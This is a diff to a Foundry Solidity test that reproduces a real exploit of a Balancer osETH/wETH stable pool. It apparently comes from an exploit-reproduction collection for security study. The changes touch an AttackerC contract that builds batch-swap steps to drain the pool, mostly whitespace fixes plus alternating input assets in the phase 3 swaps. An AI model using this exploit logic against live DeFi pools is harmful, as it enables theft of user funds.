@@ -40,7 +40,7 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(wstETH).balanceOf(address(beneficiary)), 18);
         emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(wstETH_wETH).balanceOf(address(beneficiary)), 18);
         // vm.startPrank(attacker, attacker);
-	vm.warp(1762156007); // block 23717397's timestamp, so rate provider returns the same rate as the real attack
+        vm.warp(1762156007); // block 23717397's timestamp, so rate provider returns the same rate as the real attack
         AttackerC attC = new AttackerC();
         attC.attack(osETH_wETH, 67000, 30); // offline computing numbers
         attC.withdraw(osETH_wETH);
@@ -167,7 +167,7 @@ contract AttackerC {
 
     function prepare_phase1_steps(
         bytes32 poolId,
-        address[] memory tokens, 
+        address[] memory tokens,
         uint256[] memory balances,
         uint256 BptIndex,
         uint256 initBalance
@@ -197,7 +197,7 @@ contract AttackerC {
                 } else {
                     sumAmounts[assetOutIndex] += amount;
                 }
-            
+
                 buffer[stepCount] = IBalancerVault.BatchSwapStep({
                     poolId: poolId,
                     assetInIndex: BptIndex, // BPT
@@ -310,23 +310,24 @@ contract AttackerC {
 
         buffer[stepCount++] = IBalancerVault.BatchSwapStep({
             poolId: poolId,
-            assetInIndex: 0,
+            assetInIndex: useAsset0 ? 0 : 2,
             assetOutIndex: 1,
             amount: amount,
             userData: bytes("")
         });
+        useAsset0 = !useAsset0;
         amount = helper.get_amount(actualSupply);
-        // console.log("phase 3 step amount", amount);
         buffer[stepCount++] = IBalancerVault.BatchSwapStep({
             poolId: poolId,
-            assetInIndex: 2,
+            assetInIndex: useAsset0 ? 0 : 2,
             assetOutIndex: 1,
             amount: amount,
             userData: bytes("")
         });
+        useAsset0 = !useAsset0;
         buffer[stepCount++] = IBalancerVault.BatchSwapStep({
             poolId: poolId,
-            assetInIndex: 0,
+            assetInIndex: useAsset0 ? 0 : 2,
             assetOutIndex: 1,
             amount: amount,
             userData: bytes("")
@@ -371,7 +372,7 @@ contract AttackerC {
         (uint256 amplificationParameter, bool isUpdating, uint256 precision) = IComposableStablePool(pool).getAmplificationParameter(); 
         uint256 swapFeePercentage = IComposableStablePool(pool).getSwapFeePercentage();
         uint256 rate = IComposableStablePool(pool).getRate(); 
-        (, uint256[] memory balances, uint256 lastChangeBlock) = IBalancerVault(balancer).getPoolTokens(poolId); 
+        (, uint256[] memory balances, uint256 lastChangeBlock) = IBalancerVault(balancer).getPoolTokens(poolId);
         uint256 actualSupply = IComposableStablePool(pool).getActualSupply(); 
         scalingFactors = IComposableStablePool(pool).getScalingFactors(); 
 
@@ -386,7 +387,7 @@ contract AttackerC {
         uint256[] memory newScalingFactors = new uint256[](2);
         newScalingFactors[0] = scalingFactors[0];
         newScalingFactors[1] = scalingFactors[2];
-         
+
         IBalancerVault.BatchSwapStep[] memory phase2steps = prepare_phase2_steps(
             poolId,
             newScalingFactors,
